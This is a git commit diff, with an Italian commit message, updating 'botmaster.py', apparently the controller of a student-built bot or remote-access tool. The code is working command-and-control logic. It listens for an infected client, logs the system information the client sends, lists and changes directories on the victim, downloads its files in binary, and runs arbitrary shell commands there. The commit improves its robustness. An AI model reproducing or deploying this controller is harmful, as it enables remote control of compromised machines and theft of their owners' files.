51a3526ffbbf7e42b33c4ef59d41b209dbde5a58
Giuseppe <snesnopic@gmail.com>
2022-11-08 14:19:43 +0100

    ServerName ora è 0.0.0.0 Il Timeout si applica alla socket giusta Ora proverà a creare un log con le informazioni prese Ls non crasherà con molti file nella directory attuale Get non crasherà se scritto senza argomenti Get ora crea file binari e dirà se non può ricevere

--- RetiBot/botmaster.py
+++ RetiBot/botmaster.py
@@ -1,23 +1,31 @@
+import os
+# import sys
 from socket import *
 import threading
 import time
+import datetime
 
 checkConnectionPort = 23000
 serverPort = 6677
-serverName = 'localhost'          #0.0.0.0 default
+# 0.0.0.0 default
+serverName = '0.0.0.0'
 # Thread che periodicamente fa scambiare messaggi tra master e slave per controllare che non si sia disconnesso lo slave
+
+
 def checkConnection():
     checkSocket = socket(AF_INET, SOCK_STREAM)
     checkSocket.bind((serverName, checkConnectionPort))
     checkSocket.listen(1)
     checkSocketConnection, checkAddr = checkSocket.accept()
-    checkSocket.settimeout(3)
+    checkSocketConnection.settimeout(3)
     while True:
-        checkSocketConnection.send('0'.encode())
-        message = checkSocketConnection.recv(1).decode()
-        if message != '0':
-            raise Exception("Opps!!!")
-        time.sleep(5)
+        try:
+            checkSocketConnection.send('0'.encode())
+            checkSocketConnection.recv(1).decode()
+            time.sleep(2)
+        except Exception as e:
+            checkSocketConnection.close()
+            raise e
 
 
 while True:
@@ -33,18 +41,25 @@ while True:
         print('The server is ready to receive')
         connectionSocket, addr = serverSocket.accept()
         print('Accepted a new client', addr)
-        infoBot = connectionSocket.recv(4096).decode()
+        infoBot = connectionSocket.recv(8192).decode()
         print('Informazioni ottenute: \n', infoBot)
+        try:
+            file = open(str(datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')) + '.txt', 'w')
+            file.write(infoBot)
+            file.close()
+            print("Ho salvato il log in "+os.getcwd())
+        except Exception as e:
+            print(e)
         connectionSocket.send('ok'.encode())
         command = ''
         while command != 'exit':
             print('Commands: ls, cd, get [file_name], cmd commands (on Windows systems)')
             command = input('Input a command:	')
-            print(command)
+
             if command == 'ls':
                 connectionSocket.send('ls'.encode())
-                ls = connectionSocket.recv(1024).decode()
-                cwd = connectionSocket.recv(1024).decode()
+                ls = connectionSocket.recv(409600).decode()
+                cwd = connectionSocket.recv(409600).decode()
                 print(ls)
                 print('Current working directory:	', cwd)
 
@@ -56,24 +71,29 @@ while True:
                 if len(command) != 2:
                     string = '1'+command.split(" ")[1]
                     connectionSocket.send(string.encode())
-                    print('New path:	', connectionSocket.recv(1024).decode())
+                    print('New path:	', connectionSocket.recv(90000000).decode())
 
-            if command.startswith('get') and command[1:].strip():
+            if command.startswith('get') and len(command) > 3:
                 string = '0'+command.split(" ")[1]
                 connectionSocket.send(string.encode())
-                data = connectionSocket.recv(90000000).decode()
-                file = open(string[1:], "w")
-                print("Receiving the file data.")
-                file.write(data)
-                file.close()
+                msg = connectionSocket.recv(16).decode()
+                if msg == '1':
+                    data = connectionSocket.recv(90000000)
+                    file = open(string[1:], "wb")
+                    print("Receiving the file data.")
+                    file.write(data)
+                    file.close()
+                else:
+                    print("Syntax error (you probably selected a folder or protected file)")
 
             if command != 'ls' and command != 'exit' and not command.startswith('cd') and not command.startswith('get'):
                 connectionSocket.send(command.encode())
                 out = connectionSocket.recv(1024).decode()
                 print(out)
-        print("Connessione col socket persa")
+        print("Connessione chiusa")
         connectionSocket.close()
-    except:
+        break
+    except Exception as e:
         connectionSocket.close()
         print('Connection lost, retrying...')
         continue
